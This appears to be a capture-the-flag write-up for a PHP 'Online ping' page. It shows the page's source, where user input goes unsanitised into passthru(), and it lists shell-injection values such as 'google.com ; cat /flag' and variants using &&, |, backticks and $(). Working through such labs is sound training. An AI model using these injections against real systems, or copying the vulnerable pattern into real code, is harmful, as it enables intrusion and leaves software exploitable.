1. Goes into the webpage
2. See source code
3. click

```php
<?php
register_shutdown_function('finish');
function finish(){
    echo('<p><a href="?-s">Show Source</a></p>');
}
if(isset($_GET['-s'])){
    highlight_file(__FILE__);
    die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Online ping</title>
</head>
<body>
  <h1>Online ping</h1>
  <p>Welcome to my first php program! Introducing the online ping service!</p>

<?php
  $hostname = @$_POST['hostname'];
  if (isset($hostname)) {
    echo "<pre>";
    passthru("ping -c 1 -W 1 $hostname");
    echo "</pre>";
  }
?>

<form method="post">
  <input type="text" name="hostname" placeholder="(e.g. google.com)" />
  <input type="submit" value="Ping" />
</form>

</body>
</html>
```

We can then see the php source code

```php 

<?php
  $hostname = @$_POST['hostname'];
  if (isset($hostname)) {
    echo "<pre>";
    passthru("ping -c 1 -W 1 $hostname");
    echo "</pre>";
  }
?>
```

Here the above code is vulnerable because `hostname` received from the html form 
```html 
<form method="post">
  <input type="text" name="hostname" placeholder="(e.g. google.com)" />
  <input type="submit" value="Ping" />
</form>
```
later passed into `$hostname` is never sanitized. Which allows stuff like `;`, `&&`, etc. that allows multiple commands to be passed in as well. 

```
├── flag           # Here's our flag file
├── var
│   └── www
│       └── html   # We are here
│           └── index.php
```

Since we are currently based in /var/www/html/ by default, we can use the absolute path `/flag` access the file that contains the flag (Note that `/` here means `root` directory) 

Therefore, the command we inject can be something like:

- cat /flag. Injected by `;` looks like this `google.com ; cat /flag`


### Alternative methods:
1. Using &&: google.com && cat /flag
2. Using ||: google.com || cat /flag
3. Using |: google.com | cat /flag
4. Using backticks: `cat /flag`
5. Using $(): $(cat /flag)